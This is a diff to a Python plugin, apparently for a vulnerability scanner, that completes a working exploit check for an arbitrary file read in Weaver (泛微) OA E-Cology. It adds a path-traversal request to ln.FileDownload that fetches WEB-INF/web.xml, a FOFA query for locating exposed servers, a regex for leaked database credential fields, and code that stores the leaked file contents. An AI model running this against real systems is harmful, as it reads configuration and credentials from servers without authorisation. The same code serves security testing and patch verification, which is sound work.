@@ -6,23 +6,23 @@ import re
 def msg():
   ret = {
 
-      'links'     :  '',
+      'links'     :  'https://mp.weixin.qq.com/s/upuTEkwSPbESXkpTHo9kzQ',
 
       'huixian'   :  '',
 
       'method'    :   'get',
 
-      'bugname'   :   '漏洞名',
+      'bugname'   :   '泛微OA E-Cology ln.FileDownload 任意文件读取',
 
-      'level'     :   'low/high/medium/critical',
+      'level'     :   'medium',
 
-      'FOFA'      :   '',
+      'FOFA'      :   'app="泛微-OA（e-cology）"',
 
       'author'    :   'ppxfx',
 
       'ifbug'     :   False,
 
-      'create_time':  '2024/4/8',
+      'create_time':  '2024/7/2',
   }
   return ret
 def run(url,ua):
@@ -30,13 +30,13 @@ def run(url,ua):
   headers = {
       'User-Agent': ua,
       }
-  target = ''
+  target = '/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml'
   url1 = url + target
   ret['url'] = url1
   try:
     res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
-    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
-      # ret['huixian'] = res.text
+    if res.status_code == 200 and re.search(r'DriverClasses.*?ecology.user.*?ecologypassword.*?DEBUG_MODE',res.text,re.S):
+      ret['huixian'] = res.text
       res.close()
       ret['ifbug'] = True
       return ret
